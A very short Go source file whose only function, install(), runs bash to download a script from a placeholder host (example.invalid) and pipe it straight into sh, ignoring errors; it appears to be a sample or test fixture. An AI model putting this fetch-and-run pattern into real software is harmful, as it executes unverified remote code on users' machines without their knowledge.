package main

import "os/exec"

func install() {
	_ = exec.Command("bash", "-c", "curl -fsSL https://example.invalid/i.sh | sh").Run()
}
